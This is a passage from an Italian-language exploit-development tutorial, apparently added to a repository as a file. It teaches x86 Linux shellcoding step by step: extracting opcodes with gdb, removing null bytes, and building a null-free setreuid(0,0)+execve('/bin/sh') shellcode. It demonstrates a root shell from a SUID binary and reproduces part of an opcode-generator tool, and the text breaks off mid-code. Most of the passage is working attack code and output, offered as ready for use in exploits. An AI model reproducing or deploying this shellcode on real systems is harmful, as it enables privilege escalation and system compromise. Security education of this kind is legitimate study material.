+	sscanf()
+	vsprintf()
+	realpath()
+	getopt()
+	getpass()
+	strlen()
+
+
+[===-0x04 Shellcoding-====================================================]
+
+ Lo Shellcoding è la tecnica usata per creare 'shellcode' ovvero parti di codice interpretabili
+ da un processo quando è in esecuzione (runtime), questo codice si presenta tradotto in forma 
+ esadecimale (dal binario) ed ogni singola istruzione prende il nome di OPCODE..
+ 
+ In questo modo basterà far puntare EIP all'indirizzo in memoria dove caricheremo il nostro
+ shellcode e quest'ultimo verrà interpretato con i permessi del programma..
+
+ Per creare uno shellcode in Linux, generalmente si inizia programmando le linee di codice
+ che ci interessano in un linguaggio ad alto livello, come può essere il C:
+
+ #include <stdio.h>
+
+ int main() {
+ 	printf("hello mondo\n");
+ 	exit(0);
+ }
+
+ Fatto questo ci occorre disassemblare con un debugger, e riprodurre il nostro programma in ASM:
+
+ (gdb) disas main
+ Dump of assembler code for function main:
+ 0x080483d4 <main+0>:    push   %ebp
+ 0x080483d5 <main+1>:    mov    %esp,%ebp
+ 0x080483d7 <main+3>:    sub    $0x8,%esp
+ 0x080483da <main+6>:    and    $0xfffffff0,%esp
+ 0x080483dd <main+9>:    mov    $0x0,%eax
+ 0x080483e2 <main+14>:   add    $0xf,%eax
+ 0x080483e5 <main+17>:   add    $0xf,%eax
+ 0x080483e8 <main+20>:   shr    $0x4,%eax
+ 0x080483eb <main+23>:   shl    $0x4,%eax
+ 0x080483ee <main+26>:   sub    %eax,%esp
+ 0x080483f0 <main+28>:   sub    $0xc,%esp
+ 0x080483f3 <main+31>:   push   $0x8048514
+ 0x080483f8 <main+36>:   call   0x80482d8 <printf@plt>
+ 0x080483fd <main+41>:   add    $0x10,%esp
+ 0x08048400 <main+44>:   sub    $0xc,%esp
+ 0x08048403 <main+47>:   push   $0x0
+ 0x08048405 <main+49>:   call   0x80482e8 <exit@plt>
+ End of assembler dump.
+
+ Per riprodurre printf() abbiamo bisogno dei caratteri esadecimali da pushare nello stack e del
+ numero identificativo della syscall WRITE, dobbiamo infatti tener conto che printf() non è altro che 
+ una chiamata alla write(), se proviamo a fare un strace sul nostro programma possiamo rendercene
+ conto.
+
+ $ ./strace main
+
+ tra le tante righe troviamo questa:  write(1, "hello mondo\n", 12);
+ per sapere qual'è il codice identificativo della write() per linux, ci basta controllare nella libreria
+ unistd.h:
+
+ $ grep write /usr/src/linux-2.4.31/include/asm-i386/unistd.h
+ #define __NR_write                4 // questo è il numero identificativo
+
+ Per trovare invece la nostra stringa in caratteri esadecimali, già trasformata in little endian
+ ci occorre controllare il contenuto del parametro pushato prima della chiamata alla printf():
+
+ (gdb) x/3 0x8048514
+ 0x8048514 <_IO_stdin_used+4>:   0x6c6c6568      0x6f6d206f      0x0a6f646e
+
+ NOTA: x/3, controlla 0x8048514 e i 2 indirizzi che seguono, 0x8048518 e 0x804851c
+
+ Adesso possiamo quindi stilare una prima bozza di programma in asm x86
+
+ xor %eax, %eax ; azzeriamo eax
+ xor %ecx, %ecx ; azzeriamo ecx
+
+ mov $0x1, %ebx ; poniamo %ebx (il primo parametro da passare alla write) a '1'
+ mov $0xc, %edx ; poniamo %edx (l'ultimo parametro da passare alla write) a '12', ovvero la lunghezza
+                ; della stringa.
+
+ ; pushiamo l'intera stringa trovata con gdb dentro lo stack, partendo dall'ultimo indirizzo 
+ ; sino al primo..
+
+ push %eax      ; spazio vuoto prima della stringa (carattere NULL)
+ push $0x0a6f646e 
+ push $0x6f6d206f
+ push $0x6c6c6568
+
+ mov %esp, %ecx ; memorizziamo l'attuale stack pointer dentro %ecx che conterrà l'indirizzo dove è
+                ; situata la nostra stringa
+
+ mov $0x4, %eax ; id della WRITE ..
+
+ int $0x80      ; passiamo il compito al kernel per l'esecuzione della syscall
+
+ Ora manca solo la chiamata alla exit():
+
+ $ grep exit /usr/src/linux-2.4.31/include/asm-i386/unistd.h
+ #define __NR_exit                1 // numero identificativo della EXIT
+
+ xor %eax, %eax ; azzeriamo eax
+ xor %ebx, %ebx ; azzeriamo ebx (il parametro da passare alla exit è infatti 0)
+
+ mov $0x1, %eax ; id della EXIT
+
+ int $0x80      ; esecuzione
+
+ Perfetto il nostro programma è finito, ora controlleremo il suo effettivo funzionamento servendoci
+ dell'asm inline, ovvero la possibilità di programmare linee di assembly dentro un programma in C, 
+ grazie alla funzione asm();
+
+ #include <stdio.h>
+
+ int main()
+ {
+ 	asm(	"xor %eax, %eax\n"
+ 		"xor %ecx, %ecx\n"
+ 		"mov $0x1, %ebx\n"
+ 		"mov $0xc, %edx\n"
+ 		"push %eax\n"
+ 		"push $0x0a6f646e\n"
+ 		"push $0x6f6d206f\n"
+ 		"push $0x6c6c6568\n"
+ 		"mov %esp, %ecx\n"
+ 		"mov $0x4, %eax\n"
+ 		"int $0x80\n"
+ 
+ 		"xor %eax, %eax\n"
+ 		"xor %ebx, %ebx\n"
+ 		"mov $0x1, %eax\n"
+ 		"int $0x80\n"
+ 	);
+ }
+
+ compiliamo e proviamo ad eseguirlo:
+
+ evil@eviltime:~$ gcc main.c -o main
+ evil@eviltime:~$ ./main
+ hello mondo
+ evil@eviltime:~$
+
+ Funziona!, ora non ci resta altro che effettuare la parte più meccanica del procedimento, ovvero
+ il recupero degli OPCODE..
+
+ Dobbiamo quindi disassemblare nuovamente il nostro programma, usando però la versione portata in ASM,
+ ed individuare la parte di codice programmata da noi:
+
+ (gdb) disas main
+ Dump of assembler code for function main:
+ 0x08048374 <main+0>:    push   %ebp
+ 0x08048375 <main+1>:    mov    %esp,%ebp
+ 0x08048377 <main+3>:    sub    $0x8,%esp
+ 0x0804837a <main+6>:    and    $0xfffffff0,%esp
+ 0x0804837d <main+9>:    mov    $0x0,%eax
+ 0x08048382 <main+14>:   add    $0xf,%eax
+ 0x08048385 <main+17>:   add    $0xf,%eax
+ 0x08048388 <main+20>:   shr    $0x4,%eax
+ 0x0804838b <main+23>:   shl    $0x4,%eax
+ 0x0804838e <main+26>:   sub    %eax,%esp
+ 0x08048390 <main+28>:   xor    %eax,%eax
+ 0x08048392 <main+30>:   xor    %ecx,%ecx
+ 0x08048394 <main+32>:   mov    $0x1,%ebx
+ 0x08048399 <main+37>:   mov    $0xc,%edx
+ 0x0804839e <main+42>:   push   %eax
+ 0x0804839f <main+43>:   push   $0xa6f646e
+ 0x080483a4 <main+48>:   push   $0x6f6d206f
+ 0x080483a9 <main+53>:   push   $0x6c6c6568
+ 0x080483ae <main+58>:   mov    %esp,%ecx
+ 0x080483b0 <main+60>:   mov    $0x4,%eax
+ 0x080483b5 <main+65>:   int    $0x80
+ 0x080483b7 <main+67>:   xor    %eax,%eax
+ 0x080483b9 <main+69>:   xor    %ebx,%ebx
+ 0x080483bb <main+71>:   mov    $0x1,%eax
+ 0x080483c0 <main+76>:   int    $0x80
+ 0x080483c2 <main+78>:   leave
+ 0x080483c3 <main+79>:   ret
+
+ Il nostro codice inizia da <main+28> e finisce a <main+76>, ora non ci resta altro che farci dare
+ gli OPCODE di ogni istruzione asm dal debugger stesso, e il procedimento si attua in questo modo:
+
+ (gdb) x/bx main+28
+ 0x8048390 <main+28>:    0x31 <--- questa cifra in esadecimale è l'OPCODE
+
+ quindi premiamo invio continuamente sino ad arrivare a <main+76>
+
+ (gdb)
+ 0x8048391 <main+29>:    0xc0
+ (gdb)
+ 0x8048392 <main+30>:    0x31
+
+ [...]
+
+ (gdb)
+ 0x80483c0 <main+77>:    0x80
+
+ Per ottenere uno shellcode pronto all'uso, ci basterà unire ogni opcode sostituendo lo 0 con un 
+ backslash \, in modo da ottenere l'operatore \x. 
+ Il risultato finale sarà simile a questo:
+
+ "\x31\xc0\x31\xc9\xbb\x01\x00\x00\x00\xba\x0c\x00"
+ "\x00\x00\x50\x68\x6e\x64\x6f\x0a\x68\x6f\x20\x6d"
+ "\x6f\x68\x68\x65\x6c\x6c\x89\xe1\xb8\x04\x00\x00"
+ "\x00\xcd\x80\x31\xc0\x31\xdb\xb8\x01\x00\x00\x00"
+ "\xcd\x80"
+
+ L'ultimo passaggio per testare se il nostro shellcode è funzionante, è quello di implementarlo
+ in un programma in C, seguendo questo prototipo:
+
+ #include <stdio.h>
+
+ unsigned char shellcode[] = 
+ "\x31\xc0\x31\xc9\xbb\x01\x00\x00\x00\xba\x0c\x00"
+ "\x00\x00\x50\x68\x6e\x64\x6f\x0a\x68\x6f\x20\x6d"
+ "\x6f\x68\x68\x65\x6c\x6c\x89\xe1\xb8\x04\x00\x00"
+ "\x00\xcd\x80\x31\xc0\x31\xdb\xb8\x01\x00\x00\x00"
+ "\xcd\x80";
+
+ int main() {
+ 	void (*proto)();
+	proto = (void *) shellcode;
+	proto();
+ }
+
+ compiliamo e proviamo a lanciarlo:
+
+ evil@eviltime:~$ gcc main.c -o main
+ evil@eviltime:~$ ./main
+ hello mondo
+ evil@eviltime:~$
+
+ Che dire... non fà una piega ;)
+ Tra 2 capitoli vedremo come costruire uno shellcode per una funzione un poco più complicata,
+ ma soprattutto molto più utile, poichè sarà proprio lo shellcode che useremo nell'exploit locale
+ programmato al capitolo 5..
+
+
+[===-0x04a NULL opcodes-==================================================]
+
+ Come avrete potuto notare nel precedente shellcode, sono presenti in grande quantità dei caratteri
+ nulli, ovvero '/x00'. 
+ Noi dobbiamo pensare che questo shellcode verrà utilizzato per sfruttare una vulnerabilità e non
+ per semplice scopo didattico, funzioni come strcpy() interpretano il primo carattere nullo di 
+ una stringa come riconoscimento di fine della stessa, questo porterebbe strcpy a copiare solo una
+ parte del precedente shellcode.
+
+ Per evitare di cadere in questo scenario problematico dobbiamo riconoscere, durante la fase
+ di raccoglimento degli OPCODE, quelli uguali a 0x00 e correggerli, nel nostro caso i caratteri NULL
+ sono dovuti all'uso di queste istruzioni:
+
+	"mov $0x1, %ebx"
+ 	"mov $0xc, %edx"
+ 	"mov $0x4, %eax"
+ 	"mov $0x1, %eax"
+
+ Per quale motivo queste istruzioni fanno uso di caratteri NULL (0x00) ?
+ La risposta è contenuta nella struttura di ogni registro, bisogna infatti sapere che ogni registro,
+ (EAX, EBX, ECX, EDX) è composto da 32 bit ed è scindibile in altri 3 sotto registri.
+ Rispettivamente troviamo:
+
+
+ EAX
+ 	ax ; 16 bit
+	al ; 8 bit (parte bassa)
+	ah ; 8 bit (parte alta)
+
+ EBX 
+	bx ; 16 bit 
+	bl ; 8 bit (parte bassa)
+	bh ; 8 bit (parte alta)
+
+ 
+ E così a seguire anche per ECX ed EDX:
+ 
+ ECX -> cx, cl, ch
+ EDX -> dx, dl, dh
+
+ Per evitare che il compilatore aggiunga caratteri NULL, bisogna essere più specifici quando spostiamo
+ un dato su di un registro, quindi sostituiamo le istruzioni "incriminate" ed otterremo un nuovo listato:
+
+ #include <stdio.h>
+
+ int main()
+ {
+ 	asm(	"xor %eax, %eax\n"
+ 		"xor %ecx, %ecx\n"
+		"xor %edx, %edx\n"
+ 		"xor %ebx, %ebx\n"
+		"mov $0x1, %bl\n"
+ 		"mov $0xc, %dl\n"
+ 		"push %eax\n"
+ 		"push $0x0a6f646e\n"
+ 		"push $0x6f6d206f\n"
+ 		"push $0x6c6c6568\n"
+ 		"mov %esp, %ecx\n"
+ 		"mov $0x4, %al\n"
+ 		"int $0x80\n"
+ 
+ 		"xor %eax, %eax\n"
+ 		"xor %ebx, %ebx\n"
+ 		"mov $0x1, %al\n"
+ 		"int $0x80\n"
+ 	);
+ }
+
+ Ora ripetiamo il procedimento per il recupero degli OPCODE (potete anche usare lo strumento
+ opcode.c al punto 4.3), ed otterremo uno shellcode pulito e funzionante:
+
+ \x31\xc0\x31\xc9\x31\xd2\x31\xdb\xb3\x01\xb2\x0c\x50
+ \x68\x6e\x64\x6f\x0a\x68\x6f\x20\x6d\x6f\x68\x68\x65
+ \x6c\x6c\x89\xe1\xb0\x04\xcd\x80\x31\xc0\x31\xdb\xb0
+ \x01\xcd\x80
+
+
+[===-0x04b execve("/bin/sh"); shellcode-==================================]
+
+ Incominciamo subito con l'analisi della chiamata execve() riferendoci alla pagina di man:
+
+ $ man execve
+
+ l'informazione che ci serve è la seguente, ovvero il prototipo della funzione:
+	
+	int execve(const char *filename, char *const argv [], char *const envp[]);
+
+ questa funzione si occupa di eseguire il programma puntato da 'filename', passando al 
+ programma gli argomenti dichiarati come argv[] ed eventuali environment dichiarati come envp[]
+
+ usiamola in un programma in C, dunque compiliamo e disassembliamo.. 
+
+ /* execve.c */
+ #include <unistd.h>
+ 
+ int main() {
+ 	char *sh[2] = { "/bin/sh", NULL };
+ 	execve("/bin/sh", sh, 0);
+ 	exit(0);
+ }
+
+ Usiamo gdb e disassembliamo la chiamata all'execve():
+
+ 0x400bef40 <execve+0>:  sub    $0xc,%esp
+ 0x400bef43 <execve+3>:  mov    %ebx,(%esp)
+ 0x400bef46 <execve+6>:  call   0x4004710f <__i686.get_pc_thunk.bx>
+ 0x400bef4b <execve+11>: add    $0x9d0a5,%ebx
+ 0x400bef51 <execve+17>: mov    %edi,0x8(%esp)
+ 0x400bef55 <execve+21>: mov    0xfffffebc(%ebx),%eax
+ 0x400bef5b <execve+27>: mov    0x10(%esp),%edi
+ 0x400bef5f <execve+31>: mov    %esi,0x4(%esp)
+ 0x400bef63 <execve+35>: test   %eax,%eax
+ 0x400bef65 <execve+37>: je     0x400bef6c <execve+44>
+ 0x400bef67 <execve+39>: call   0x40047020 <__pthread_kill_other_threads_np@plt>
+ 0x400bef6c <execve+44>: mov    0x14(%esp),%ecx
+ 0x400bef70 <execve+48>: mov    0x18(%esp),%edx
+ 0x400bef74 <execve+52>: xchg   %ebx,%edi
+ 0x400bef76 <execve+54>: mov    $0xb,%eax
+ 0x400bef7b <execve+59>: int    $0x80
+ [...] 
+
+ Ci troviamo davanti ad una funzione un pò più complessa, vediamo quindi di riprodurla
+ in asm prendendo in considerazione solo qualche semplice appunto:
+
+ La execve() come ogni altra chiamata vuole trovarsi nei registri EBX,ECX e EDX 
+ i parametri che gli spettano, e quindi rispettivamente i seguenti dati 
+ "stringa", "indirizzo della stringa", NULL.
+
+ Per affrontare i punti seguenti abbiamo bisogno di introdurre un nuovo registro,
+ una nuova funzione e la teoria delle LABEL:
+
+ Il registro ESI: questo registro accoppiato con il registro EDI sta per Source Index
+ serve per puntare ad una locazione di memoria sulla quale vogliamo scrivere, è usato
+ quindi per la manipolazione delle stringhe.
+
+ LABEL: una LABEL è un'etichetta identificativa per una parte di codice, un esempio
+ pratico è quello fornito con la spiegazione della funzione JMP
+
+ La funzione JMP: questa funzione segue la sintassi JMP <indirizzo>. 
+ dove "indirizzo" è una locazione di memoria, utilizzando questa funzione il programma 
+ salterà (JUMP) direttamente all'indirizzo specificato, questa funzione è usata
+ ad esempio per creare dei loop (cicli):
+
+ mov $0x3, %eax         ; verrà eseguita una sola volta, perchè è fuori dall'etichetta
+ CICLO:                 ; la mia LABEL
+ 	nop             ; No Operation (capitolo 5.2)
+	jmp CICLO       ; salto alla CICLO da me creata creando un ciclo infinito
+ 	mov $0x0, %eax  ; questa istruzione non verrà mai eseguita
+
+ 
+ bastarebbe quindi pushare la nostra stringa nello stack, individuarla, dunque
+ preparare i parametri, associarli ai rispettivi registri, e infine effettuare
+ la chiamata all'execve();
+
+ Cè un problema nella nostra teoria, non sappiamo in quale indirizzo di memoria finirà
+ la nostra stringa contenente "/bin/sh", e quindi ci sarà impossibile passarla come
+ parametro alla execve();
+
+ per fare questo, ci serviremo della CALL (vista nei primi capitoli), questa funzione
+ sposta l'esecuzione del programma all'indirizzo specificato, modificando ESP, mentre
+ mette in EIP l'indirizzo dell'istruzione successiva in modo da recuperare la normale
+ esecuzione del listato una volta usata la RET. Ci occorrerà dunque dichiarare la 
+ nostra stringa subito dopo una CALL in modo da avere su EIP l'indirizzo della stessa.
+
+ Un listato in assembly molto semplice per la comprensione è questo:
+
+ jmp STRINGA         ; salto all'etichetta STRINGA
+ INIZIO
+	 pop %esi    ; l'ultimo dato inserito nello stack sarà EIP (contenente 
+                     ; l'indirizzo dove è situata la nostra stringa, quindi lo preleviamo 
+                     ; e lo salviamo dentro il registro %esi, 
+	 leave       ; esco
+
+ STRINGA
+	call INIZIO  ; salvo EIP nello stack e vado all'etichetta INIZIO
+ 	.string "/bin/sh" ; indirizzo che verrà salvato su EIP
+
+ Compreso questo piccolo giochetto, possiamo ora passare alla costruzione dello shellcode
+ Dobbiamo innanzitutto riconoscere le istruzioni utili, che in questo caso sono davvero poche:
+
+ 0x400bef5b <execve+27>: mov    0x10(%esp),%edi
+ 0x400bef6c <execve+44>: mov    0x14(%esp),%ecx
+ 0x400bef70 <execve+48>: mov    0x18(%esp),%edx
+
+ queste 3 istruzioni spostano il primo parametro in %edi (contenente la stringa), il secondo parametro
+ in %ecx (contenente l'indirizzo della stringa), e infine il terzo parametro in %edx (0)
+ a questo punto vegono scambiati i contenuti di due registri
+
+ 0x400bef74 <execve+52>: xchg   %ebx,%edi
+
+ Cosicchè il contenuto di edi finisce in ebx (e viceversa)
+ quindi salviamo il numero identificativo della SYS_execve in EAX e passiamo il compito al kernel
+ per l'esecuzione.
+
+ 0x400bef76 <execve+54>: mov    $0xb,%eax
+ 0x400bef7b <execve+59>: int    $0x80
+
+ Riadattiamo quindi tutto alle nostre esigenze e otterremo il seguente codice:
+
+ jmp get_eip             ; salto alla label get_eip
+ start:
+ 	pop %esi         ; salvo EIP in ESI
+	push %esi        ; pusho %esi nello stack
+
+ Adesso dovremo preparare i parametri con ordine quindi, nella prima parte di %esi lasciamo la stringa
+ aggiungendo un carattere NULL per indicarne la fine..
+
+	xor %eax, %eax      ; azzero EAX in modo da servirmi del suo valore azzerato per evitare di usare
+                            ; caratteri NULL (0x0) nel codice
+
+ 	mov %al, 0x7(%esp)  ; pongo il carattere nullo alla fine della stringa.
+
+ perchè lo pongo proprio all'offset 0x7 dal registro ebp?
+ questo succede perchè la stringa /bin/sh è composta da 7 caratteri e occuperà quindi da 0x0 a 0x6, ponendo
+ un carattere di fine stringa alla posizione 0x7 otterremo "/bin/sh\0".
+
+	mov %esi, 0x8(%esp)   ; pongo l'indirizzo della stringa al secondo parametro
+	mov %eax, 0xc(%esp)   ; setto a NULL il terzo parametro
+
+ si è scelto 0xc perchè l'indirizzo della stringa passato al secondo parametro occuperà 4 bit
+ 
+ Ora non ci resta altro che preparare EBX, ECX, e EDX per essere passati alla execve
+
+	mov %esi, %ebx        ; copio ESI in EBX, primo parametro
+	lea 0x8(%esp), %ecx   ; indirizzo della stringa, secondo parametro
+	lea 0xc(%esp), %edx   ; NULL, terzo parametro
+
+ dunque effettuiamo la chiamata:
+
+	mov $0xb, %al   ; copio il valore 11 (SYS_execve) nella parte bassa di eax
+	int $0x80       ; chiamata
+
+ e ora dichiariamo la label get_eip:
+
+	get_eip: call start
+		 .string \"/bin/sh\"  ; i caratteri \ servono ad indicare al C che gli apici
+                                      ; non indicano la fine della funzione, ma devono essere
+                                      ; interpretati come tutti gli altri caratteri
+
+ Portiamo infine il tutto in un programma in C usando la funzione asm() e aggiungiamo sotto
+ la chiamata all'execve, una chiamata alla exit() (vista in precedenza)
+
+ int main() 
+ {
+ 	asm(	"jmp get_eip\n"
+		"start: pop %esi\n"
+		"push %esi\n"
+		"xor %eax, %eax\n"
+		"mov %ah, 0x7(%esp)\n"
+		"mov %esi, 0x8(%esp)\n"
+		"mov %eax, 0xc(%esp)\n"
+		"lea 0x8(%esp), %ecx\n"
+		"lea 0xc(%esp), %edx\n"
+		"mov %esi, %ebx\n"
+		"mov $0xb, %al\n"
+		"int $0x80\n"
+
+		// exit(0);
+		"xor %eax, %eax\n"
+ 		"xor %ebx, %ebx\n"
+ 		"mov $0x1, %al\n"
+ 		"int $0x80\n"
+
+		"get_eip: call start\n"
+		".string \"bin/sh\"\n"
+	);
+ }
+
+ Se proviamo a compilare il programma, all'esecuzione non otteniamo nient'altro che un'altro prompt
+
+ sh-3.1$ ./scode
+ sh-3.1$ 
+
+ questo è dovuto al fatto che per ottenere una shell root, la execve deve essere chiamata con i permessi
+ di root e il programma deve essere SUID..
+
+ un programma con SUID dà all'utente normale la possibilità di essere avviato con i permessi di root
+ per svolgere questa operazione basta che il root digiti il comando
+
+ # chmod +s FILE
+
+ In linux sono molti i programmi con SUID già impostato, e molti di loro sono potenzialmente vulnerabili..
+ un altro accorgimento, ma sta volta di nostro compito, è quello di usare setreuid() prima della chiamata
+ all'execve.
+
+	int setreuid(uid_t ruid, uid_t euid);
+
+ questa funzione imposta l'ID reale ed effettivo del processo corrente, servirà dunque ad impostare
+ gli ID di root al programma prima che chiami la execve()
+ il nostro execve.c diventerà quindi
+ 
+ /* execve.c */
+ #include <unistd.h>
+ #include <sys/types.h>
+
+ int main() {
+ 	char *sh[2] = { "/bin/sh", NULL };
+	setreuid(0,0);
+ 	execve("/bin/sh", sh, 0);
+ 	exit(0);
+ }
+ 
+
+ Adesso la setreuid(0,0) và portata in assembler, ma sarà una cosa semplice ed immediata,
+ ci servono soltanto 3 informazioni, una la prendiamo da unistd.h e le altre 
+ sono di facile intuizione:
+
+ 	EAX deve contenere il numero della chiamata: 70 (preso da unistd.h)
+	EBX contiene il primo parametro: 0
+	ECX il secondo parametro: 0
+
+ il nostro codice in assembly sarà il seguente:
+
+	xor %eax, %eax
+	xor %ebx, %ebx
+	xor %ecx, %ecx
+	mov $0x46, %eax ; 70 in esadecimale
+	int $0x80       ; chiamo l'interrupt
+
+ Uniamo ora il tutto e otteniamo il seguente listato
+
+ 
+ int main() 
+ {
+ 	asm(	// setreuid(0,0)
+		"xor %eax, %eax\n"
+		"xor %ebx, %ebx\n"
+		"xor %ecx, %ecx\n"
+		"mov $0x46, %al\n"
+		"int $0x80\n"
+
+		// execve("/bin/sh")
+		"jmp get_eip\n"
+		"start: pop %esi\n"
+		"push %esi\n"
+		"xor %eax, %eax\n"
+		"mov %ah, 0x7(%esp)\n"
+		"mov %esi, 0x8(%esp)\n"
+		"mov %eax, 0xc(%esp)\n"
+		"lea 0x8(%esp), %ecx\n"
+		"lea 0xc(%esp), %edx\n"
+		"mov %esi, %ebx\n"
+		"mov $0xb, %al\n"
+		"int $0x80\n"
+
+		// exit(0);
+		"xor %eax, %eax\n"
+ 		"xor %ebx, %ebx\n"
+ 		"mov $0x1, %al\n"
+ 		"int $0x80\n"
+
+		"get_eip: call start\n"
+		".string \"/bin/sh\"\n"
+	);
+ }
+
+ Per vedere se funziona eseguiamo i seguenti comandi dalla nostra shell:
+
+ root@eviltime:~# gcc execve.c -o execve (compiliamo)
+ root@eviltime:~# chmod +s execve	 (settiamo il programma come SUID)
+ root@eviltime:~# su evil                (ci logghiamo da user)
+
+ e quindi eseguiamo il programma
+
+ evil@eviltime:/root$ ./execve
+ sh-3.1# id
+ uid=0(root) gid=0(root) groups=0(root)
+
+ Perfetto il programma funziona, dopo l'esecuzione abbiamo a nostra disposizione una shell
+ con privilegi root.. ora per costruire il nostro shellcode ci serviremo del programma
+ proposto al paragrafo 4.2 (date un occhiata al paragrafo per capire come funziona
+ il programma in questione, o altrimenti costruite il vostro shellcode a mano seguendo
+ quanto detto in precedenza)
+ 
+ Ed ecco che una volta dato in pasto il nostro listato asm al programma opcode.c
+ otteniamo uno shellcode pronto per essere utilizzato:
+
+
+ /* x86-execve.c - 62 bytes shellcode coded by evil
+  * setreuid(0,0) + execve bin/sh + exit
+
+
+ #include <stdio.h>
+
+ char *shellcode=
+ "\x31\xc0"                    /* xor    %eax,%eax */
+ "\x31\xdb"                    /* xor    %ebx,%ebx */
+ "\x31\xc9"                    /* xor    %ecx,%ecx */
+ "\xb0\x46"                    /* mov    $0x46,%al */
+ "\xcd\x80"                    /* int    $0x80 */
+ "\xeb\x26"                    /* jmp    32 <get_eip> */
+ "\x5e"                        /* pop    %esi */
+ "\x56"                        /* push   %esi */
+ "\x31\xc0"                    /* xor    %eax,%eax */
+ "\x88\x64\x24\x07"            /* mov    %ah,0x7(%esp) */
+ "\x89\x74\x24\x08"            /* mov    %esi,0x8(%esp) */
+ "\x89\x44\x24\x0c"            /* mov    %eax,0xc(%esp) */
+ "\x8d\x4c\x24\x08"            /* lea    0x8(%esp),%ecx */
+ "\x8d\x54\x24\x0c"            /* lea    0xc(%esp),%edx */
+ "\x89\xf3"                    /* mov    %esi,%ebx */
+ "\xb0\x0b"                    /* mov    $0xb,%al */
+ "\xcd\x80"                    /* int    $0x80 */
+ "\x31\xc0"                    /* xor    %eax,%eax */
+ "\x31\xdb"                    /* xor    %ebx,%ebx */
+ "\xb0\x01"                    /* mov    $0x1,%al */
+ "\xcd\x80"                    /* int    $0x80 */
+ "\xe8\xd5\xff\xff\xff"        /* call   c <start> */
+ "\x2f\x62\x69\x6e\x2f\x73\x68";  /* /bin/sh */
+
+ int main(void) {
+ 	printf("lunghezza shellcode = %d bytes\n", strlen(shellcode));
+ 	((void (*)(void)) shellcode)();
+ 	return 0;
+ }
+
+
+ Il nostro shellcode è pronto per essere utilizzato, anche all'interno di un exploit, poichè
+ non contiene alcun NULL byte.
+
+
+[===-0x04c Automatizzare il recupero degli OPCODE (opcode.c)-=============]
+
+ Quando si tratta di lavorare su listati asm molto lunghi, e non si ha ne la voglia, ne il tempo
+ di recuperare tutti gli opcode a mano, ci vengono in aiuto strumenti chiamati Shellcode Generator,
+ qui di seguito vi lascio il code di uno di questi strumenti, che è sicuramente uno tra i più
+ validi e minimalisti che si possano trovato in rete..
+
+ il suo utilizzo è semplice, ci basta portare il nostro listato in .C in un listato .S, per fare
+ questo ci viene incontro GCC:
+
+ evil@eviltime:/root$ gcc -S execve.c
+ 
+ il risultato andrà a finire nel file execve.s, aprendo questo file con un editor di testo 
+ troveremo il seguente listato:
+
+
+        .file   "execve.c"
+        .text
+ .globl main
+        .type   main, @function
+ main:
+        pushl   %ebp
+        movl    %esp, %ebp
+        subl    $8, %esp
+        andl    $-16, %esp
+        movl    $0, %eax
+        addl    $15, %eax
+        addl    $15, %eax
+        shrl    $4, %eax
+        sall    $4, %eax
+        subl    %eax, %esp
+ #APP
+        xor %eax, %eax
+	xor %ebx, %ebx
+	xor %ecx, %ecx
+	mov $0x46, %al
+	int $0x80
+	jmp get_eip
+	start: pop %esi
+	push %esi
+	xor %eax, %eax
+	mov %ah, 0x7(%esp)
+	mov %esi, 0x8(%esp)
+	mov %eax, 0xc(%esp)
+	lea 0x8(%esp), %ecx
+	lea 0xc(%esp), %edx
+	mov %esi, %ebx
+	mov $0xb, %al
+	int $0x80
+	xor %eax, %eax
+	xor %ebx, %ebx
+	mov $0x1, %al
+	int $0x80
+	get_eip: call start
+	.string "/bin/sh"
+
+ #NO_APP
+        leave
+        ret
+        .size   main, .-main
+        .section        .note.GNU-stack,"",@progbits
+        .ident  "GCC: (GNU) 3.4.6"
+
+
+ Da questo file bisogna togliere la funzione main e le ultime righe sotto #NO_APP, quindi
+ ottenere un file come questo:
+
+
+	.file	"execve.c"
+	.text
+ .globl main
+	xor %eax, %eax
+	xor %ebx, %ebx
+	xor %ecx, %ecx
+	mov $0x46, %al
+	int $0x80
+	jmp get_eip
+	start: pop %esi
+	push %esi
+	xor %eax, %eax
+	mov %ah, 0x7(%esp)
+	mov %esi, 0x8(%esp)
+	mov %eax, 0xc(%esp)
+	lea 0x8(%esp), %ecx
+	lea 0xc(%esp), %edx
+	mov %esi, %ebx
+	mov $0xb, %al
+	int $0x80
+	xor %eax, %eax
+	xor %ebx, %ebx
+	mov $0x1, %al
+	int $0x80
+	get_eip: call start
+	.string "/bin/sh"
+
+ A questo punto compiliamo il nostro listato .s con 'as' (man as) e quindi passiamo il 
+ programma compilato in pasto al nostro shellcode generator.
+
+ evil@eviltime:/root$ as execve.s -o execve.o
+ evil@eviltime:/root$ ./opcode execve.o
+
+ Il risultato che otterremo sarà quello visto al paragrafo precedente..
+ A voi il listato dello shellcode generator:
+
+ 
+ #include <stdio.h>
+ #include <stdlib.h>
+ #include <sys/types.h>
+ #include <sys/stat.h>
+ #include <fcntl.h>
+ #include <string.h>
+ 
+ int ishex(char c)
+ {
+         if(isdigit(c)||c=='a'||c=='b'||c=='c'||c=='d'||c=='e'||c=='f')
+         {
+                 return 1;
+         }
+         return 0;
+ }
+ 
+ int shellparse(char line[])
+ {
+        int a=0,i=0;
+ 
+        int col=0, set=0, ctli=25; //ctli = control i
+ 
+        //jumper
+        if(strstr(line, "section") != NULL) return 0;
+        if(strstr(line, "Disas") != NULL) return 0;
+        if(strstr(line, "file") != NULL && strstr(line, "format") != NULL) return 0;
+        if(strstr(line, ">") != NULL && strstr(line, ">:") != NULL) return 0;
+ 
+        for(i=0;i<=strlen(line);i++)
+        {
+                if(line[i] == ':')
+                {
+                        col = i;
+                        continue;
+                }
+ 
+                if(col == 0) continue;
+                if(i == col+1) printf(" \"");
+                if(i == col+24)
+                {
+                        printf("\"");
+                        set = 1;
+                }
+ 
+                if(i == col+24)
+                {
+                        for(a=0;a<ctli;a++)
+                                printf(" ");
+ 
+                        for(a=23;a>ctli;ctli++)
+                                printf("\b");
+ 
+                        printf(" /* ", ctli);
+                }
+                if(line[i] == '\n')
+                {
+                        printf(" */\n");
+                        return 0;
+                }
+                if(set == 0 && ishex(line[i]) && ishex(line[i+1]))
+                {
+                        printf("\\x%c\%c", line[i], line[i+1]);
+                        ctli-=2;
+                }
+                else if(set == 1) //plain text
+                {
+                        printf("%c", line[i]);
+                }
+        }
+        return 0;
+ }
+ 
+ int shellgen(char tool[])
+ {
+        FILE *fp;
+        char line[256], cmd[255-strlen(tool)];
+ 
+        snprintf(cmd, sizeof(cmd), "objdump -d %s", tool);
+ 
+        if((fp = popen(cmd, "r")) == NULL)
+        {
+                printf("popen error, try to popon later");
+                exit(1);
+        }
+ 
+        //output source
+        puts("#include <stdio.h>\n");
+        printf("char *shellcode=\n");
